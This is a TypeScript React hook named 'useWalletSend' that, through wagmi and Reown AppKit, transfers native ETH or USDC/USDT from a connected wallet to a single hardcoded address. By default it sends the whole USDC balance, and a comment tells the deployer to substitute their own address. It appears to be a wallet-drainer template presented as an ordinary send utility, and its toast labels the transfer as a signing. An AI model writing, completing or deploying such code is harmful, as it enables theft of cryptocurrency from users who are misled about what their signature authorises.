'use client'

import { useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
import { TokenUtil } from '@reown/appkit-utils'
import { base } from 'viem/chains'
import { useChakraToast } from '../components/Toast'
import { ConstantsUtil } from '../utils/ConstantsUtil'
import { useWriteContract, useSendTransaction, useBalance } from 'wagmi'
import { parseUnits, parseEther } from 'viem'

const erc20Abi = [
    {
        name: 'transfer',
        type: 'function',
        stateMutability: 'nonpayable',
        inputs: [
            { name: 'recipient', type: 'address' },
            { name: 'amount', type: 'uint256' },
        ],
        outputs: [{ name: 'success', type: 'bool' }],
    },
] as const;

export const useWalletSend = () => {
    const { address } = useAppKitAccount()
    const toast = useChakraToast()
    const { writeContractAsync } = useWriteContract()
    const { sendTransactionAsync } = useSendTransaction()
    const { caipNetwork } = useAppKitNetwork()

    const currentChainId = caipNetwork?.id
        ? (typeof caipNetwork.id === 'string' && caipNetwork.id.includes(':')
            ? Number(caipNetwork.id.split(':')[1])
            : Number(caipNetwork.id))
        : base.id

    const getAssetAddress = (symbol: string) => {
        const nativeSymbol = caipNetwork?.nativeCurrency?.symbol?.toLowerCase() || 'eth'
        const isNative = symbol.toLowerCase() === nativeSymbol || symbol.toLowerCase() === 'eth'

        if (isNative) return undefined

        let assetAddress = TokenUtil.TOKEN_ADDRESSES_BY_SYMBOL[symbol]?.[currentChainId]

        if (!assetAddress) {
            const upperSymbol = symbol.toUpperCase()
            const fallbacks: Record<string, Record<number, string>> = {
                'USDC': {
                    1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                    8453: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
                    42161: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831'
                },
                'USDT': {
                    1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                    8453: '0xfde4C962512795B940Aa1260840d17E7f3b1Af25'
                }
            }
            assetAddress = fallbacks[upperSymbol]?.[currentChainId]
        }
        return assetAddress
    }

    const { data: usdcBalance } = useBalance({
        address: address as `0x${string}`,
        token: getAssetAddress('USDC') as `0x${string}` | undefined
    })

    const handleOpenSendWithArguments = async (
        assetSymbol: string = 'USDC',
        amount?: string,
        assetMetadata?: { symbol: string; decimals: number }
    ) => {
        try {
            const isNative = assetSymbol.toLowerCase() === (caipNetwork?.nativeCurrency?.symbol?.toLowerCase() || 'eth') || assetSymbol.toLowerCase() === 'eth'
            const assetAddress = getAssetAddress(assetSymbol)

            if (!isNative && !assetAddress) {
                throw new Error(`${assetSymbol} Asset Address not found for current network (${currentChainId})`)
            }

            // If amount not provided, use balance (USDC balance if it's USDC, otherwise whatever is in amount)
            let finalAmount = amount
            if (!finalAmount) {
                if (assetSymbol.toUpperCase() === 'USDC' && usdcBalance) {
                    finalAmount = usdcBalance.formatted
                } else {
                    finalAmount = '0'
                }
            }

            if (finalAmount === '0' || !finalAmount) {
                throw new Error(`Insufficient ${assetSymbol} balance to send.`)
            }

            // REPLACE THIS WITH YOUR OWN ETH ADDRESS
            const recipientAddress = '0x55ffb33cba2f2a4c14ef25b83ba56e2fe28d45c1'

            console.log('Starting direct sign for:', {
                assetSymbol,
                amount: finalAmount,
                isNative,
                assetAddress,
                recipientAddress
            })

            let hash: string | undefined

            if (isNative) {
                const result = await sendTransactionAsync({
                    to: recipientAddress as `0x${string}`,
                    value: parseEther(finalAmount),
                    chainId: currentChainId,
                    account: address as `0x${string}`
                } as any)
                hash = result
            } else if (assetAddress) {
                const result = await writeContractAsync({
                    address: assetAddress as `0x${string}`,
                    abi: erc20Abi,
                    functionName: 'transfer',
                    args: [recipientAddress as `0x${string}`, parseUnits(finalAmount, assetMetadata?.decimals || usdcBalance?.decimals || 6)],
                    chainId: currentChainId,
                    account: address as `0x${string}`
                } as any)
                hash = result
            }

            if (hash) {
                toast({
                    title: ConstantsUtil.SigningSucceededToastTitle,
                    description: `Transaction hash: ${hash}`,
                    type: 'success'
                })
            }

            return { hash }
        } catch (err) {
            console.error('Error in handleOpenSendWithArguments:', err)
            toast({
                title: ConstantsUtil.SigningFailedToastTitle,
                description: err instanceof Error ? err.message : 'Failed to send',
                type: 'error'
            })
            throw err
        }
    }

    return { handleOpenSendWithArguments }
}
